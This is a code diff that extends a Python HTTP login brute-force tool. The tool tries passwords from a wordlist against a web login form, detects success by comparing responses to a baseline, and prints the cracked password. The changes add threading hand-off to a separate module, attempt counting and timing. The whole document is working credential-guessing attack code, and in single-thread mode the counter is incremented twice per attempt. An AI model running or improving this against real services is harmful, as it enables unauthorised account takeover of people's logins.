@@ -2,9 +2,11 @@
 import sys
 import argparse
 import requests
+import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
 from tabulate import tabulate
+import subprocess
 
 def parse_args():
     parser = argparse.ArgumentParser(description="HTTP Brute-Force Login Tool")
@@ -44,10 +46,12 @@ def is_password_correct(response, baseline, mode):
             len(response.content) != baseline["length"] or
             response.url != baseline["url"]
         )
-    else:
-        return False
+    return False
 
-def try_password(url, username, password, baseline, mode, verbose, found_event):
+def try_password(url, username, password, baseline, mode, verbose, found_event, attempt_lock, attempt_counter, result_holder):
+    with attempt_lock:
+        attempt_counter[0] += 1
+
     if found_event.is_set():
         return False
     try:
@@ -66,10 +70,10 @@ def try_password(url, username, password, baseline, mode, verbose, found_event):
                 print(tabulate(table, headers=["Check", "Response", "Baseline"]))
 
         if correct:
-            print(f"\n[+] Password found: {password}")
+            print(f"\n[✅] Password found: {password}")
+            result_holder["password"] = password
             found_event.set()
             return True
-
     except requests.RequestException as e:
         if not found_event.is_set():
             print(f"[!] Error trying {password}: {e}")
@@ -77,6 +81,21 @@ def try_password(url, username, password, baseline, mode, verbose, found_event):
 
 def main():
     args = parse_args()
+
+    if args.threads > 10:
+        print(f"[⚙️] Offloading to threaded engine (threads: {args.threads})...")
+        command = [
+            "python3", "modules/http_threader.py",
+            "--url", args.url,
+            "--username", args.username,
+            "--wordlist", args.wordlist,
+            "--mode", args.mode,
+            "--threads", str(args.threads)
+        ]
+        if args.verbose:
+            command.append("--verbose")
+        subprocess.run(command)
+        return
 
     if args.cred:
         if ":" not in args.cred:
@@ -106,15 +125,24 @@ def main():
 
     baseline = get_baseline(args.url, args.username)
     found_event = threading.Event()
+    attempt_counter = [0]
+    attempt_lock = threading.Lock()
+    result_holder = {"password": None}
+    start_time = time.time()
 
     if args.threads > 1:
         with ThreadPoolExecutor(max_workers=args.threads) as executor:
-            futures = {executor.submit(try_password, args.url, args.username, pw, baseline, args.mode, args.verbose, found_event): pw for pw in passwords}
+            futures = {
+                executor.submit(
+                    try_password, args.url, args.username, pw,
+                    baseline, args.mode, args.verbose, found_event,
+                    attempt_lock, attempt_counter, result_holder
+                ): pw for pw in passwords
+            }
             try:
                 for future in as_completed(futures):
                     if future.result():
-                        for fut in futures:
-                            fut.cancel()
+                        found_event.set()
                         break
             except KeyboardInterrupt:
                 print("\n[!] Interrupted by user. Exiting...")
@@ -122,14 +150,27 @@ def main():
     else:
         try:
             for pw in passwords:
-                if try_password(args.url, args.username, pw, baseline, args.mode, args.verbose, found_event):
+                with attempt_lock:
+                    attempt_counter[0] += 1
+                if try_password(args.url, args.username, pw, baseline, args.mode, args.verbose, found_event, attempt_lock, attempt_counter, result_holder):
                     break
+        except requests.RequestException as e:
+            print(f"[!] Error during brute-force: {e}")
         except KeyboardInterrupt:
-            print("\n[!] Interrupted by user. Exiting...")
-            found_event.set()
+            print("\n[!] Interrupted by user.")
 
-    if not found_event.is_set():
-        print("\n[-] Brute-force finished. Password not found.")
+    end_time = time.time()
+    elapsed = round(end_time - start_time, 2)
+
+    print(f"\n[🔢] Total attempts: {attempt_counter[0]}")
+    print(f"[⏱️] Time taken: {elapsed} seconds")
+
+    if found_event.is_set():
+        print(f"[🔐] Username: {args.username}")
+        print(f"[🔓] Cracked Password: {result_holder['password']}")
+        print("[🎉] Brute-force successful.")
+    else:
+        print("[-] Brute-force finished. Password not found.")
 
 if __name__ == "__main__":
     main()
